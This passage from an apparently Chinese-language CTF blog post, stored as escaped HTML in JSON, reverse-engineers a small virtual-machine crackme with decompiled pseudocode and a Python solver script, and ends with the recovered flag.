+ <span class=\"number\">16</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_DWORD *)(result + <span class=\"number\">176</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">32</span>) = <span class=\"number\">-16</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">40</span>) = sub_100001D70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">48</span>) = <span class=\"number\">-15</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">56</span>) = sub_100001A60;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">64</span>) = <span class=\"number\">-14</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">72</span>) = sub_100001AA0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">80</span>) = <span class=\"number\">-12</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">88</span>) = sub_100001CB0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">96</span>) = <span class=\"number\">-11</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">104</span>) = sub_100001CF0;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">112</span>) = <span class=\"number\">-13</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">120</span>) = sub_100001B70;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">128</span>) = <span class=\"number\">-10</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">136</span>) = sub_100001B10;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">144</span>) = <span class=\"number\">-9</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">152</span>) = sub_100001D30;</span><br><span class=\"line\">  *(_BYTE *)(result + <span class=\"number\">160</span>) = <span class=\"number\">-8</span>;</span><br><span class=\"line\">  *(_QWORD *)(result + <span class=\"number\">168</span>) = sub_100001C60;</span><br><span class=\"line\">  qword_100003F58 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x400</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __memcpy_chk((<span class=\"keyword\">char</span> *)qword_100003F58 + <span class=\"number\">48</span>, a2, <span class=\"number\">18L</span>L, <span class=\"number\">-1L</span>L);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由上述，逆向得到结构体中的关键变量如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">  DWORD num0; <span class=\"comment\">// + 0</span></span><br><span class=\"line\">  DWORD num4; <span class=\"comment\">// + 4</span></span><br><span class=\"line\">  DWORD num8; <span class=\"comment\">// + 8</span></span><br><span class=\"line\">  DWORD num12; <span class=\"comment\">// + 12</span></span><br><span class=\"line\">  DWORD flag; <span class=\"comment\">// + 16</span></span><br><span class=\"line\">  DWORD result; <span class=\"comment\">// + 176</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>结构体中其他字段为常数和常量函数指针，后续算法中这些常数和函数指针是一一对应的。常数分别为：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array = [<span class=\"number\">0xf0</span>, <span class=\"number\">0xf1</span>, <span class=\"number\">0xf2</span>, <span class=\"number\">0xf4</span>, <span class=\"number\">0xf5</span>, <span class=\"number\">0xf3</span>, <span class=\"number\">0xf6</span>, <span class=\"number\">0xf7</span>, <span class=\"number\">0xf8</span>]</span><br></pre></td></tr></table></figure>\n<p>最后在0x100001f00中，首先令结构体的0x24偏移处指向一块内存区域，然后循环调用sub_100001e50。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001F00</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  *(_QWORD *)(myclass + <span class=\"number\">24</span>) = (<span class=\"keyword\">char</span> *)&amp;loc_100001980 + <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) != <span class=\"number\">243</span> )</span><br><span class=\"line\">    sub_100001E50(myclass);</span><br><span class=\"line\">  <span class=\"built_in\">free</span>(qword_100003F58);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(myclass + <span class=\"number\">176</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>sub_100001e50的f5代码如下：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span> __<span class=\"function\">fastcall <span class=\"title\">sub_100001E50</span><span class=\"params\">(__int64 myclass)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">bool</span> result; <span class=\"comment\">// al</span></span><br><span class=\"line\">  <span class=\"keyword\">bool</span> v2; <span class=\"comment\">// [rsp+Fh] [rbp-11h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v3; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">      v2 = v3 &lt; <span class=\"number\">9</span>;</span><br><span class=\"line\">    result = v2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( **(<span class=\"keyword\">unsigned</span> __int8 **)(myclass + <span class=\"number\">24</span>) == *(<span class=\"keyword\">unsigned</span> __int8 *)(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span>) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v4 = <span class=\"number\">1</span>;</span><br><span class=\"line\">      (*(<span class=\"keyword\">void</span> (__fastcall **)(__int64))(<span class=\"number\">16L</span>L * v3 + myclass + <span class=\"number\">32</span> + <span class=\"number\">8</span>))(myclass);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      ++v3;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果那块内存区域中当前指针指向的位置的标志与相应的常数相同，就执行相应的函数指针的所指向的函数操作。</p>\n<p>最后是需要result字段为1，而result字段为1需要调用sub_10001d30函数。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __<span class=\"function\">fastcall <span class=\"title\">sub_100001D30</span><span class=\"params\">(__int64 a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  result = *(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> *)(*(_QWORD *)(a1 + <span class=\"number\">24</span>) + <span class=\"number\">1L</span>L);</span><br><span class=\"line\">  *(_DWORD *)(a1 + <span class=\"number\">176</span>) = result;</span><br><span class=\"line\">  *(_QWORD *)(a1 + <span class=\"number\">24</span>) += <span class=\"number\">5L</span>L;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看起来似乎十分复杂，但我们仔细观察一下那块内存区域。</p>\n<p>可以看到\\xf0, \\xf8, \\xf2, \\xf6这些标志位重复的出现，而在0xc6和0xcc偏移处出两次出现\\xf7，由上述sub_10001d30函数的F5代码看出，在若结构体中的指针指向0xc6处，将会把结构体中的result字段设置为1（因为紧接着\\xf7的一个byte为\\x01）。这时我们悟到，程序中会多次执行\\xf0, \\xf8, \\xf2, \\xf6对应的函数指针的函数操作，直到结构体中0x24处的指针走到0xc6偏移处。此时我们只需要对这四个函数进行逆向即可，下面给出这4个函数算法的Python实现。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func0</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum0 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x11</span>:</span><br><span class=\"line\">\t\tnum4 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x12</span>:</span><br><span class=\"line\">\t\tnum8 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x13</span>:</span><br><span class=\"line\">\t\tnum12 = magic[index + <span class=\"number\">2</span>]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> magic[index + <span class=\"number\">1</span>] == <span class=\"number\">0x14</span>:</span><br><span class=\"line\">\t\tnum0 = input_str[cur]</span><br><span class=\"line\">\tindex += <span class=\"number\">6</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func2</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 == input_str[cur]:\t</span><br><span class=\"line\">\t\tflag = <span class=\"number\">1</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func6</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> flag == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\tflag = <span class=\"number\">0</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tindex += magic[index + <span class=\"number\">1</span>]</span><br><span class=\"line\">\tindex += <span class=\"number\">2</span></span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">func8</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> num0 &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> num0 &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num0 &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\tv5 = (<span class=\"number\">2</span> + num0 - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tv5 = num0</span><br><span class=\"line\">\tnum0 = v5</span><br><span class=\"line\">\tindex += <span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>​    实际上，magic bytes中每个\\xf0后面跟的都是0x10，所以我们将每个\\xf0后跟的第二个字节根据func8的逻辑进行变换，即可得到最后的flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, mark <span class=\"keyword\">in</span> enumerate(magic):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ord(mark) == <span class=\"number\">0xf0</span> <span class=\"keyword\">and</span> ord(magic[i+<span class=\"number\">1</span>]) == <span class=\"number\">0x10</span>:</span><br><span class=\"line\">\t\tnum = ord(magic[i+<span class=\"number\">2</span>])</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> num &gt;= <span class=\"number\">0x41</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x5a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">65</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">elif</span> num &gt;= <span class=\"number\">0x61</span> <span class=\"keyword\">and</span> num &lt;= <span class=\"number\">0x7a</span>:</span><br><span class=\"line\">\t\t\tnum = (<span class=\"number\">2</span> + num - <span class=\"number\">97</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tnum = num</span><br><span class=\"line\">\t\tflag += chr(num)</span><br><span class=\"line\"><span class=\"keyword\">print</span> flag</span><br></pre></td></tr></table></figure>\n<p>flag如下：<br>DDCTF{helloYouGotTheFlag}</p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":8,"path":"api/tags/pwn.json"},{"name":"RE","slug":"RE","count":2,"path":"api/tags/RE.json"}]}